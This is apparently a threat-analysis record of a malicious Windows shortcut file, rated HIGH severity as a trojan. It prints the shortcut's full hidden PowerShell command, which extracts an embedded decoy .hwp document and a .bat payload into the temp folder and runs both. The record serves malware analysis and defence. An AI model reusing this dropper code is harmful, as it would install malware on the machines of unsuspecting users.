threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

lnk_info.command_line_arguments: /c powershell -windowstyle hidden $dirPath = Get-Location; if($dirPath -Match 'System32' -or $dirPath -Match 'Program Files') {$dirPath = '%temp%'}; $lnkpath = Get-ChildItem -Path $dirPath -Recurse *.lnk ^| where-object {$_.length -eq 0x0001DAB452} ^| Select-Object -ExpandProperty FullName; $pdfFile = gc $lnkpath -Encoding Byte -TotalCount 00065446 -ReadCount 00065446; $pdfPath = '%temp%\230401.hwp'; sc $pdfPath ([byte[]]($pdfFile ^| select -Skip 002470)) -Encoding Byte; ^& $pdfPath; $exeFile = gc $lnkpath -Encoding Byte -TotalCount 00068696 -ReadCount 00068696; $exePath = '%temp%\230401.bat'; sc $exePath ([byte[]]($exeFile ^| select -Skip 00065446)) -Encoding Byte; ^& $exePath;
